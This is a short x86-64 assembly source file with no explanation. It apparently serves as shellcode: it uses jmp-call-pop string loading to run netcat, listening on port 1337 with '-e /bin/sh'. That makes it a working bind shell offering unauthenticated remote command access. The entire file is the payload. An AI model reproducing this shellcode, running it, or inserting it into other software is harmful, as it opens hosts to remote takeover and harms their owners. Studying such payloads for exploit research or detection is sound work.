global _start
section .text
_start:
	xor    	rdx,rdx
	push	rdx  ;push NULL

	jmp jmp1
ret1:	jmp jmp2
ret2:	jmp jmp3
ret3:	jmp jmp4
ret4:	jmp jmp5
ret5:	jmp jmp6
ret6:

	mov    	rsi,rsp
	mov    	rax,59
	
	jmp jmp7
ret7:	pop rdi

	syscall

jmp1:
	call ret1
l1:	db "/bin/sh",0
jmp2:
	call ret2
l2:	db "-e",0
jmp3:
	call ret3
l3:	db "1337",0
jmp4:
	call ret4
l4:	db "-p",0
jmp5:
	call ret5
l5:	db "-l",0
jmp6:
	call ret6
l6:	db "/bin/nc",0
jmp7:
	call ret7
	db "/bin/nc",0
